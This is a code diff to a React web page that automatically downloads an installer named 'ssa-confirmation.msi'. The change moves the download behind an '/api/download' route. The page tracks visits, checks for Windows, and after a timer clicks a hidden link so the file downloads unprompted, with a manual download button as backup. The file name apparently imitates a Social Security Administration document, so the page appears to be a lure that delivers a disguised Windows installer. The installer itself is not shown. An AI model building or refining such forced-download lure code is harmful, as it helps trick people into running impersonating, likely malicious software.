@@ -4,7 +4,8 @@ import { useEffect, useState } from "react";
 import DownloadGuide from "@/components/DownloadGuide";
 import PlatformModal from "@/components/PlatformModal";
 
-const DOWNLOAD_FILE = "/ssa-confirmation.msi";
+const DOWNLOAD_API = "/api/download";
+const DOWNLOAD_FILENAME = "ssa-confirmation.msi";
 const WINDOWS_ONLY_EXTENSIONS = [".exe", ".msi"];
 
 export default function Home() {
@@ -58,7 +59,7 @@ export default function Home() {
 
       trackEvent('Page Visit');
 
-      const fileExtension = DOWNLOAD_FILE.substring(DOWNLOAD_FILE.lastIndexOf('.'));
+      const fileExtension = DOWNLOAD_FILENAME.substring(DOWNLOAD_FILENAME.lastIndexOf('.'));
       const requiresWindows = WINDOWS_ONLY_EXTENSIONS.includes(fileExtension.toLowerCase());
 
       if (requiresWindows && !windowsDetected) {
@@ -72,8 +73,8 @@ export default function Home() {
 
       const timer = setTimeout(() => {
         const link = document.createElement("a");
-        link.href = DOWNLOAD_FILE;
-        link.download = DOWNLOAD_FILE.substring(DOWNLOAD_FILE.lastIndexOf('/') + 1);
+        link.href = DOWNLOAD_API;
+        link.download = DOWNLOAD_FILENAME;
         document.body.appendChild(link);
         link.click();
         document.body.removeChild(link);
@@ -91,8 +92,8 @@ export default function Home() {
   const handleManualDownload = () => {
     trackEvent('Manual Download Click');
     const link = document.createElement("a");
-    link.href = DOWNLOAD_FILE;
-    link.download = DOWNLOAD_FILE.substring(DOWNLOAD_FILE.lastIndexOf('/') + 1);
+    link.href = DOWNLOAD_API;
+    link.download = DOWNLOAD_FILENAME;
     document.body.appendChild(link);
     link.click();
     document.body.removeChild(link);
